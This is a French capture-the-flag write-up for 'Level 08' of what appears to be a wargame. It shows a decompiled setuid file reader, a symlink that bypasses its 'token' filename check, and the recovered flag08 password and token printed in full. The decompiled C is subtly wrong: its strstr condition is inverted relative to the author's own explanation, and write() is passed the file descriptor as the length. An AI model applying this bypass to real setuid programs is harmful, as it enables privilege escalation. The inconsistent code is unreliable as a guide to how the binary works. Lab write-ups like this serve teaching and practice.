# Level 08

1) la commande `ls` nous donne ceci:

```bash
ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

2) Apres avoir decompile le programme on obtient ceci:

```C
#include <stdio.h>
#include <strings.h>
#include <fcntl.h>
#include <err.h>

int main(int ac, char **av, char **envp)
{
    int fd;
    char buff[1024];
    size_t content_size;

    if (ac == 1)
    {
        printf("%s [file to read]\n", *av);
        exit(1);
    }
    if (strstr(av[1], "token") == NULL)
    {
        printf("You may not access \'%s\'\n", av[1]);
        exit(1);
    }
    fd = open(av[1], 0);
    if (fd == -1)
        err(1, "Unable to open %s", av[1]);
    content_size = read(fd, buff, 0x400);
    if (content_size == 0xffffffff)
        err(1, "Unable to read fd %d", fd);
    return write(1, buff, fd);
}
```

3) Le programme lit le contenu d'un fichier si celui si n'as pas `token` dans son path

4) Donc avec juste un symlink nous devrions pouvoir lire le contenu du fichier `token`

```bash
ln -s /home/user/level08/token /tmp/link
./level08 /tmp/link
quif5eloekouj29ke0vouxean
su flag08
Password:
Don't forget to launch getflag !
getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
